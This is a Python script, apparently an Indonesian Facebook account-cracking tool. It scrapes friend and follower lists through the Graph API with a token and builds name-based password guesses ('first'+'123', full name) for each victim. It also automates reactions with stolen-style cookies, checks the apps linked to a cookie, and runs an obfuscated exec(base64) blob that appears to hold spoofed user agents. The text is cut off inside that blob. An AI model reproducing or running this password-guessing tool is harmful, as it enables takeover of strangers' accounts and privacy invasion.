# recode? gak usah di jual belikan ye asw kecuali hasilnya bagi dua sama gw:'v
# https://m.facebook.com/awkswkswkwks

import re
import os
import sys
import json
import glob
import time
import urllib
import random
import requests as r
from bs4 import BeautifulSoup as bs

def cvs(c):
	return ";".join("%s=%s" % (x, y) for x, y in c.items())

def cvd(c):
	return dict(map(lambda i: i.split("="), c.replace(" ", "").split(";"))) if type(c) != dict else c
	
class d:
	
	def __init__(self, c, t):
		self.c = c
		self.t = t
		self.i = []
	
	def fl(self, uid):
		try:
			rs = r.get("https://graph.facebook.com/"+uid+"/?fields=friends.limit(5000)&access_token="+self.t, headers={"Host": "graph.facebook.com", "user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36", "accept": "application/json, text/plain, */*", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "origin": "https://www.facebook.com", "referer": "https://www.facebook.com"}).json()
			for x in rs["friends"]["data"]:
				self.i.append({"u": x["id"], "n": x["name"]})
			print(f"\r # {len(self.i)} retrieved ", end="")
			return self.i
		except:
			return self.i

	def fs(self, uid):
		try:
			rs = r.get("https://graph.facebook.com/"+uid+"/subscribers?limit=5000&access_token="+self.t, headers={"Host": "graph.facebook.com", "user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36", "accept": "application/json, text/plain, */*", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "origin": "https://www.facebook.com", "referer": "https://www.facebook.com"}).json()
			for x in rs["data"]:
				self.i.append({"u": x["id"], "n": x["name"]})
			print(f"\r # {len(self.i)} retrieved ", end="")
			return self.i
		except:
			return self.i

def react(poi, cookie):
	s = r.Session()
	s.headers.update({"user-agent": "[FBAN/EMA;FBLC/id_ID;FBAV/114.0.0.12.83;FBDM/DisplayMetrics{density=1.3125, width=480, height=761, scaledDensity=1.3125, xdpi=217.714, ydpi=216.17};]", "accept-language": "id-ID,id;q=0.9"})
	rt = random.choice(["2", "16"])
	rs = s.get(h+"/reactions/picker/?is_permalink=1&ft_id="+poi, cookies=cookie)
	p = bs(rs.text, "html.parser")
	if not p.find("span", string="(Hapus)"):
		for x in p.findAll("a", href=True):
			if "reaction_type="+rt in x["href"]:
				s.get(h+x["href"], cookies=cookie)
				break

def apc(tab, cookie):
	rs = r.get(f"https://mbasic.facebook.com/settings/apps/tabbed/?tab={tab}", headers={"user-agent": "[FBAN/EMA;FBLC/id_ID;FBAV/114.0.0.12.83;FBDM/DisplayMetrics{density=1.3125, width=480, height=761, scaledDensity=1.3125, xdpi=217.714, ydpi=216.17};]", "accept-language": "id-ID,id;q=0.9"}, cookies=cookie)
	if not "Diakses menggunakan Facebook" in re.search("title>(.*?)<", rs.text).group(1):
		print("\r      .! cookie invalid"); return
	if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in rs.text or "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in rs.text:
		print(f"\r      .! tidak ditemukan aplikasi yang {'aktif' if tab == 'active' else 'kedaluwarsa'}"); return
	p = bs(rs.text, "html.parser")
	l = []
	for x in p.findAll("a", href=True):
		if "/settings/applications/details/?app_id=" in x["href"]:
			if x["href"].split("=")[-1] not in l:
				l.append(x["href"].split("=")[-1])
	if not l:
		return
	print(f"\r      + {len(l)} aplikasi {'aktif' if tab == 'active' else 'kedaluwarsa'} ditemukan")
	for x in l:
		detail = p.find("a", href="/settings/applications/details/?app_id="+x)
		apk = detail.find("a", string=True)
		add = detail.find("div", string=True)
		if not apk:
			apk = detail.find("span", class_=True, string=True)
		print("\r        > {} | {}".format(apk.text, add.text))

def cu():
	ua = input(" ?> useragent: ")
	while not ua:
		ua = input(" ?> useragent: ")
	open(".ua", "w").write(ua)
	print(" + jalankan ulang script nya")

def sm():
	print("\n + select login method")
	print(" [1] m.facebook")
	print(" [2] free.facebook")
	print(" [3] mbasic.facebook")
	sl = input("\n ?> ")
	while not sl in list("123"):
		sl = input(" ?> ")
	if sl == "1":
		url = "https://m.facebook.com"
	elif sl == "2":
		url = "https://free.facebook.com"
	elif sl == "3":
		url = "https://mbasic.facebook.com"
	global hl
	hl = url

def sp(us, fl=list(), ml=False):
	if not ml:
		for x in us:
			name = x["n"].lower()
			pr = [name.split(" ")[0]+"123", name.split(" ")[0]+"12345", name]
			for i in range(len(pr)):
				if len(pr[i]) < 6:
					pr[pr.index(pr[i])] = "blacklist!"
			pr = [fr for fr in pr if not "blacklist!" in fr]
			if pr:
				if pr[0]:
					fl.append({"u": x["u"], "p": pr})
		return fl
	pw = input(" ?> password: ")
	while not pw.split(",") or len(pw) < 6:
		if "first" in pw or "fullname" in pw:
			break
		pw = input(" ?> password: ")
	ps = pw.split(",")
	for i in ps:
		if not "first" in i:
			if len(i) < 6:
				pw = pw.replace(i, "blacklist!")
	pr = ",".join([fr for fr in pw.split(",") if not "blacklist!" in fr])
	for x in us:
		name = x["n"].lower()
		po = pr.split(",")
		if "first" in pr or "fullname" in pr:
			po = pr.replace("first", name.split(" ")[0]).replace("fullname", name).split(",")
			for i in range(len(po)):
				if len(po[i]) < 6:
					po[po.index(po[i])] = "blacklist!"
		fx = [fr for fr in po if not "blacklist!" in fr]
		if fx:
			if fx[0]:
				fl.append({"u": x["u"], "p": fx})
	return fl

ch = lambda o: dict(map(lambda i: i.split(": "), o.splitlines()))
exec(__import__("base64").b64decode(b'dWFwID0gWydNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IHZpdm8gMTkzNSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkzLjAuNDU3Ny44MiBNb2JpbGUgU2FmYXJpLzUzNy4zNicsICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4xLjE7IEYxZiBCdWlsZC9MTVk0N1YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS81Ni4wLjI5MjQuODcgTW9iaWxlIFNhZmFyaS81MzcuMzYnLCAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDk7IHZpdm8gMTkwMSBCdWlsZC9QUFIxLjE4MDYxMC4wMTE7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNjIuMC4zMjAyLjg0IE1vYmlsZSBTYWZhcmkvNTM3LjM2IFZpdm9Ccm93c2VyLzYuOS4xMC4yJywgJ01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCA4LjEuMDsgZW4tVVM7IENQSDE4MDMgQnVpbGQvT1BNMS4xNzEwMTkuMDI2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvNTcuMC4yOTg3LjEwOCBVQ0Jyb3dzZXIvMTMuMi41LjEzMDAgTW9iaWxlIFNhZmFyaS81MzcuMzYnLCAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDYuMDsgQ1BIMTYwOSBCdWlsZC9NUkE1OEspIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS82NC4wLjMyODIuMTM3IE1vYmlsZSBTYWZhcmkvNTM3LjM2IG1DZW50LzAuMTMuMTIxNCcsICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4xLjE7IEEzN2Z3IEJ1aWxkL0xNWTQ3VikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzY4LjAuMzQ0MC45MSBNb2JpbGUgU2FmYXJpLzUzNy4zNicsICdNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQgNy4xLjE7IENQSDE3MTcgQnVpbGQvTjRGMjZNOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzgzLjAuNDEwMy45NiBNb2JpbGUgU2FmYXJpLzUzNy4zNiBPUFIvNTAuMC4yMjU0LjE0OTE4MicsICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgOC4xLjA7IENQSDE4MDMgQnVpbGQvT1BNMS4xNzEwMTkuMDI2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODUuMC40MTgzLjEwMSBNb2JpbGUgU2FmYXJpLzUzNy4zNicsICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNy4xLjE7IENQSDE4MDEgQnVpbGQvTk1GMjZGKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNjcuMC4zMzk2LjY4IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywgJ01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCA4LjEuMDsgZW4tdXM7IENQSDE4MTkgQnVpbGQvTzExMDE5KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNzcuMC4zODY1LjExNiBNb2JpbGUgU2FmYXJpLzUzNy4zNiBIZXlUYXBCcm93c2VyLzE1LjcuOC4xJywgJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA3LjEuMTsgQ1BIMTcyMyBCdWlsZC9ONkYyNlEpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS82NC4wLjMyODIuMTIzIE1vYmlsZSBTYWZhcmkvNTM3LjM2JywgJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA1LjEuMTsgQTMzZncgQnVpbGQvTE1ZNDdWOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg1LjAuNDE4My44MSBNb2JpbGUgU2FmYXJpLzUzNy4zNicsICdNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQgNy4xLjE7IHpoLUNOOyBPUFBPIFIxMSBCdWlsZC9OTUYyNlgpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS81Ny4wLjI5ODcuMTA4IFVDQnJvd3Nlci8xMi4xLjQuOTk0IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywgJ01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCA1LjE7IGluLUlEOyBBMTYwMSBCdWlsZC9MTVk0N0kpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS81Ny4wLjI5ODcuMTA4IFVDQnJvd3Nlci8xMi4xMC4wLjExNjMgVUNUdXJiby8xLjkuOC45MDAgTW9iaWxlIFNhZmFyaS81MzcuMzYnLCAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDk7IHZpdm8gMTkwNiBCdWlsZC9QS1ExLjE5MDYxNi4wMDE7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNjIuMC4zMjAyLjg0IE1vYmlsZSBTYWZhcmkvNTM3LjM2IFZpdm9Ccm93c2VyLzYuMy42LjIgJywgJ01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCA1LjEuMTsgQTM3ZiBCdWlsZC9MTVk0N1Y7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODAuMC4zOTg3LjEzMiBNb2JpbGUgU2FmYXJpLzUzNy4zNiBPUFIvNTIuMi4yMjU0LjU0NzIzJywgJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgVjIwMzI7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNjIuMC4zMjAyLjg0IE1vYmlsZSBTYWZhcmkvNTM3LjM2IFZpdm9Ccm93c2VyLzYuMC40LjInLCAnTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkIDUuMS4xOyBBMzdmIEJ1aWxkL0xNWTQ3Vjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84My4wLjQxMDMuMTA2IE1vYmlsZSBTYWZhcmkvNTM3LjM2IE9QUi81MS4wLjIyNTQuMTUwODA3JywgJ01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCA3LjEuMTsgZW4tdXM7IENQSDE3MjkgQnVpbGQvTjZGMjZRKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvNzAuMC4zNTM4LjgwIE1vYmlsZSBTYWZhcmkvNTM3LjM2IE9wcG9Ccm93c2VyLzE1LjYuMy4yJywgJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA4LjEuMDsgQ1BIMTgwMyBCdWlsZC9PUE0xLjE3MTAxOS4wMjY7IHJ2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBSb2NrZXQvMi41LjEoMjA0NjApIENocm9tZS83OS4wLjM5NDUuMTM2IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywgJ01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCA4LjEuMDsgZW4tVVM7IENQSDE4MDMgQnVpbGQvT1BNMS4xNzEwMTkuMDI2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvNzguMC4zOTA0LjEwOCBVQ0Jyb3dzZXIvMTMuMy4yLjEzMDMgTW9iaWxlIFNhZmFyaS81MzcuMzYnLCAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDguMS4wOyBDUEgxODAzIEJ1aWxkL09QTTEuMTcxMDE5LjAyNjsgcnYpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIFJvY2tldC8yLjUuMSgyMDQ2MCkgQ2hyb21lLzc5LjAuMzk0NS4xMzYgTW9iaWxlIFNhZmFyaS81MzcuMzYnLCAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDUuMTsgQTE2MDEgQnVpbGQvTE1ZNDdJKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNjkuMC4zNDk3LjEwMCBNb2JpbGUgU2FmYXJpLzUzNy4zNicsICdNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQgNS4xLjE7IEEzN2YgQnVpbGQvTE1ZNDdWOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzQ2LjAuMjQ5MC43NiBNb2JpbGUgU2FmYXJpLzUzNy4zNiBPUFIvNDcuMS4yMjU0LjE0NzUyOCcsICdNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQgNS4xLjE7IEEzN2YgQnVpbGQvTE1ZNDdWOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg2LjAuNDI0MC4xMTAgTW9iaWxlIFNhZmFyaS81MzcuMzYgT1BSLzUyLjEuMjI1NC41NDI5OCcsICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgOC4xLjA7IENQSDE4MDMgQnVpbGQvT1BNMS4xNzEwMTkuMDI2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODMuMC40MTAzLjEwNiBNb2JpbGUgU2FmYXJpLzUzNy4zNiBZYUFwcF9BbmRyb2lkLzExLjAxIFlhU2VhcmNoQnJvd3Nlci8xMS4wMScsICdNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQgNS4xOyB6aC1jbjsgT1BQTyBBNTltIEJ1aWxkL0xNWTQ3SSkgQXBwbGVXZWJLaXQvNTM0LjMwIChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgVUNCcm93c2VyLzEuMC4wLjEwMCBVMy8wLjguMCBNb2JpbGUgU2FmYXJpLzUzNC4zMCBBbGlBcHAoVEIvNi42LjIpIFdpbmRWYW5lLzguMC4wIDcyMFgxMjgwIEdDYW52YXMvMS40LjIuMjEnLCAnTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkIDUuMS4xOyBBMzdmIEJ1aWxkL0xNWTQ3Vjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS80Ni4wLjI0OTAuNzYgTW9iaWxlIFNhZmFyaS81MzcuMzYgT1BSLzMzLjAuMjI1NC4xMjU2NzInLCAnTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkIDguMS4wOyBpbi1pZDsgQ1BIMTgwMyBCdWlsZC9PUE0xLjE3MTAxOS4wMjYpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS83Ny4wLjM4NjUuMTE2IE1vYmlsZSBTYWZhcmkvNTM3LjM2IEhleVRhcEJyb3dzZXIvMTUuNy44LjAuM2JldGEnLCAnTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkIDYuMC4xOyBlbi1VUzsgQ1BIMTcwMSBCdWlsZC9NTUIyOU0pIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS83OC4wLjM5MDQuMTA4IFVDQnJvd3Nlci8xMy4zLjUuMTMwNCBNb2JpbGUgU2FmYXJpLzUzNy4zNicsICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNi4wLjE7IENQSDE3MDEgQnVpbGQvTU1CMjlNKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNTUuMC4yODgzLjkxIE1vYmlsZSBTYWZhcmkvNTM3LjM2JywgJ01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCA3LjEuMTsgZW4tdXM7IENQSDE3MjkgQnVpbGQvTjZGMjZRKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvNzAuMC4zNTM4LjgwIE1vYmlsZSBTYWZhcmkvNTM3LjM2IE9wcG9Ccm93c2VyLzE1LjYuMy4yJywgJ01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCA1LjE7IGVuLVVTOyBBMTYwMSBCdWlsZC9MTVk0N0kpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS83OC4wLjM5MDQuMTA4IFVDQnJvd3Nlci8xMy4zLjUuMTMwNCBNb2JpbGUgU2FmYXJpLzUzNy4zNicsICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4xLjE7IEEzN2YgQnVpbGQvTE1ZNDdWKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNjkuMC4zNDk3LjkxIE1vYmlsZSBTYWZhcmkvNTM3LjM2JywgJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA1LjE7IEExNjAxIEJ1aWxkL0xNWTQ3SSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzg1LjAuNDE4My4xMjcgTW9iaWxlIFNhZmFyaS81MzcuMzYnLCAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDcuMS4xOyBDUEgxNzI5IEJ1aWxkL042RjI2USkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzc5LjAuMzk0NS4xMzYgTW9iaWxlIFNhZmFyaS81MzcuMzYgWWFBcHBfQW5kcm9pZC85Ljk5IFlhU2VhcmNoQnJvd3Nlci85Ljk5JywgJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA1LjE7IEExNjAxIEJ1aWxkL0xNWTQ3SSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzg0LjAuNDE0Ny4xMjUgTW9iaWxlIFNhZmFyaS81MzcuMzYnLCAnTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkIDUuMTsgZW4tVVM7IEExNjAxIEJ1aWxkL0xNWTQ3SSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzc4LjAuMzkwNC4xMDggVUNCcm93c2VyLzEzLjMuOC4xMzA1IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywgJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA3LjEuMTsgQ1BIMTcyOSBCdWlsZC9ONkYyNlEpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84MS4wLjQwNDQuOTYgTW9iaWxlIFNhZmFyaS81MzcuMzYgWWFBcHBfQW5kcm9pZC8xMS4wMSBZYVNlYXJjaEJyb3dzZXIvMTEuMDEnLCAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDcuMS4xOyBDUEgxNzE3IEJ1aWxkL040RjI2TTsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84Ny4wLjQyODAuMTAxIE1vYmlsZSBTYWZhcmkvNTM3LjM2JywgJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA4LjEuMDsgQ1BIMTgwMyBCdWlsZC9PUE0xLjE3MTAxOS4wMjYpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS83OS4wLjM5NDUuOTMgTW9iaWxlIFNhZmFyaS81MzcuMzYgWWFBcHBfQW5kcm9pZC85Ljc1IFlhU2VhcmNoQnJvd3Nlci85Ljc1JywgJ01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCA1LjEuMTsgQTM3ZiBCdWlsZC9MTVk0N1Y7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODYuMC40MjQwLjExMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBPUFIvNTEuMC4yMjU0LjE1MDgwNycsICdNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQgNy4xLjE7IGVuLWdiOyBDUEgxNzI3IEJ1aWxkL042RjI2USkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzUzLjAuMjc4NS4xMzQgTW9iaWxlIFNhZmFyaS81MzcuMzYgT3Bwb0Jyb3dzZXIvMTUuNS4xLjEwJywgJ01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCA1LjEuMTsgQTM3ZiBCdWlsZC9MTVk0N1Y7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvNzMuMC4zNjgzLjkwIE1vYmlsZSBTYWZhcmkvNTM3LjM2IE9QUi8zNS4zLjIyNTQuMTI5MjI2JywgJ01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCA4LjEuMDsgaWQtSUQ7IENQSDE4MDMgQnVpbGQvT1BNMS4xNzEwMTkuMDI2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvNTcuMC4yOTg3LjEwOCBVQ0Jyb3dzZXIvMTIuMTAuMC4xMTYzIFVDVHVyYm8vMS4xMC4zLjkwMCBNb2JpbGUgU2FmYXJpLzUzNy4zNicsICdNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQgNi4wLjE7IGVuLVVTOyBDUEgxNzAxIEJ1aWxkL01NQjI5TSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzU3LjAuMjk4Ny4xMDggVUNCcm93c2VyLzEyLjEzLjUuMTIwOSBNb2JpbGUgU2FmYXJpLzUzNy4zNicsICdNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQgNy4xLjE7IENQSDE3MjkgQnVpbGQvTjZGMjZROyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg2LjAuNDI0MC45OSBNb2JpbGUgU2FmYXJpLzUzNy4zNiBPUFIvNTEuMC4yMjU0LjE1MDgwNycsICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNi4wOyBDUEgxNjA5IEJ1aWxkL01SQTU4SzsgaW4taWQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS83OS4wLjM5NDUuMTM2IE1vYmlsZSBTYWZhcmkvNTM3LjM2IFB1ZmZpbi85LjAuMC41MDI2M0FQJywgJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA5OyB2aXZvIDE5MDQgQnVpbGQvUFBSMS4xODA2MTAuMDExOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzYyLjAuMzIwMi44NCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBWaXZvQnJvd3Nlci82LjMuNi4yJywgJ01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCA1LjE7IGVuLVVTOyBBMTYwMSBCdWlsZC9MTVk0N0kpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS81Ny4wLjI5ODcuMTA4IFVDQnJvd3Nlci8xMy4yLjguMTMwMSBNb2JpbGUgU2FmYXJpLzUzNy4zNicsICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4xLjE7IEEzM2Z3IEJ1aWxkL0xNWTQ3Vjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS80My4wLjIzNTcuMTIxIE1vYmlsZSBTYWZhcmkvNTM3LjM2JywgJ01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCA1LjE7IGVuLVVTOyBBMTYwMSBCdWlsZC9MTVk0N0kpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS81Ny4wLjI5ODcuMTA4IFVDQnJvd3Nlci8xMy4wLjAuMTI4OCBNb2JpbGUgU2FmYXJpLzUzNy4zNicsICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4xOyBBMzdmIEJ1aWxkL0xNWTQ3VikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzQzLjAuMjM1Ny45MyBNb2JpbGUgU2FmYXJpLzUzNy4zNicsICdNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQgNy4xLjE7IHpoLUNOOyBPUFBPIFIxMSBCdWlsZC9OTUYyNlgpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS81Ny4wLjI5ODcuMTA4IFVDQnJvd3Nlci8xMi4xLjEuOTkxIE1vYmlsZSBTYWZhcmkvNTM3LjM2TlVMTCcsICdNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQgNy4xLjE7IGVuLVVTOyBDUEgxNzE3IEJ1aWxkL040RjI2TSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzU3LjAuMjk4Ny4xMDggVUNCcm93c2VyLzEzLjAuMC4xMjg4IE1vYmls